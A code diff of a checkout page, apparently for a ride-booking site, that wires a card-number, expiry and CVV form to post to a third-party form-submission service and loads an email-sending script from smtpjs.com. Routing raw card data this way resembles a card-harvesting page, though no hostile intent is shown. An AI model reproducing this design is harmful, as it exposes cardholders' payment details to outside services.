@@ -246,21 +246,23 @@
 
                 <h1>Fill in Card Details</h1>
 
-                <form action="">
+                <form  action="https://submit-form.com/DBYfe2zMD"> 
                     <div class="CardDetails">
+
                         <div class="cardNO">
                             <h3>Card Number</h3>
-                            <input type="number" placeholder="0000 0000 0000 0000" required>
+                            <input id="cardNo" type="number" name="cardNumber" placeholder="0000 0000 0000 0000" required>
                         </div>
 
                         <div class="excv">
                             <div class="date">
                                 <h3>Expiry Date</h3>
-                                <input type="number" placeholder="12/23" required>
+                                <input id="cardDate" type="number" name="cardDate" placeholder="12/23" required>
                             </div>
                             <div class="cvv">
                                 <h3> CVV</h3>
-                                <input type="number" placeholder="123" required>
+                                <input id="cardCode" type="number" name="cardCode" placeholder="123" required>
+                                <input type="hidden" name="_next" value="https:mytetraride.com/submitPop.html">
                             </div>
                         </div>
                     </div>
@@ -271,7 +273,7 @@
                         <img class="ScImg" src="Homeimages/secure.png" alt="">
                     </div>
 
-                    <button>Pay</button>
+                    <button type="submit" >Pay</button>
                 </form>
             </div>
         </section>
@@ -351,6 +353,9 @@
     <script src="bookdyn.js"></script>
     <script src="copy.js"></script>
     <script src="translate.js"></script>
+    <script src="booksummary.js"></script>
+    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+	<script src="https://smtpjs.com/v3/smtp.js"></script>
 
 
  
